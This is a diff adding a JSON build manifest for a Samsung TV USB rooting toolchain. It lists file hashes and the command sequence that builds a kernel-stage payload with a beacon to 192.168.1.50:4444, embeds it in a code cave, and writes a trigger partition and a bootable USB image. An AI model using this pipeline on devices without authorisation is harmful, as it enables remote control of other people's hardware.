@@ -1,0 +1,75 @@
+{
+  "variant": "musel-umh-boot",
+  "beacon": "192.168.1.50:4444",
+  "verification": "static image verification only",
+  "files": {
+    "stage.bin": {
+      "bytes": 1016,
+      "sha256": "45fe9d586800f6b812edd6849b10a95e9d81b347ac32913438809667ff50f32f"
+    },
+    "stage.S": {
+      "bytes": 5311,
+      "sha256": "2c8484b1cbbb2784baeb943450f4f03d91074caae7aced9550f4ea9b850bb317"
+    },
+    "cave.bin": {
+      "bytes": 1168,
+      "sha256": "aa5148d8ff79a2a62359b263ebcd5e742f6316c8d1ad820b82236a8561e06ace"
+    },
+    "p1.img": {
+      "bytes": 8388608,
+      "sha256": "56f255a1f58a09755d8b67c4766f9639ddbcffcc4dfbba4c9349ecd0ff208f3a"
+    },
+    "p2.img": {
+      "bytes": 67108864,
+      "sha256": "c60bd24a296a1fb540a5c416490b9565a52778f000982f110a6bf5ec0c6a9434"
+    },
+    "usb.img": {
+      "bytes": 83886080,
+      "sha256": "c9e0e31cdac2ec7b4c8a1afc58202f1dfd45788b4a645542b0f9fbbbfdc3ffe9"
+    }
+  },
+  "commands": [
+    [
+      "build_kernel_stage_musel_umh.py",
+      "--out",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\stage.bin",
+      "--keep-asm",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\stage.S",
+      "--beacon",
+      "192.168.1.50:4444",
+      "--boot",
+      "--no-patch"
+    ],
+    [
+      "build_cave_blob_kant.py",
+      "--profile",
+      "musel",
+      "--payload",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\stage.bin",
+      "--out",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\cave.bin"
+    ],
+    [
+      "build_trigger_musel.py",
+      "--cave-blob",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\cave.bin",
+      "--out",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\p1.img"
+    ],
+    [
+      "verify_trigger_musel.py",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\p1.img",
+      "--cave-blob",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\cave.bin"
+    ],
+    [
+      "build_usb_kant.py",
+      "--p1",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\p1.img",
+      "--p2",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\p2.img",
+      "--out",
+      "C:\\Users\\singh\\Documents\\Default Project\\samsung-tv-usb-root\\samsung-tv-usb-root-kant-m2-main\\musel_build\\musel-umh-boot\\usb.img"
+    ]
+  ]
+}
